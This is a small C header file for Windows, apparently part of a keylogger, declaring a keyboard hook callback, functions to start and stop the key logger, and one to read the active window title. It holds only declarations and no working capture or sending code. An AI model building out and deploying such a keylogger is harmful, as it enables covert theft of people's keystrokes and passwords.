#ifndef HOOKS_H
#define HOOKS_H

#include <windows.h>

// Function declarations
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeyLogger();
void StopKeyLogger();
char* GetActiveWindowTitle();  // Only declaration here

#endif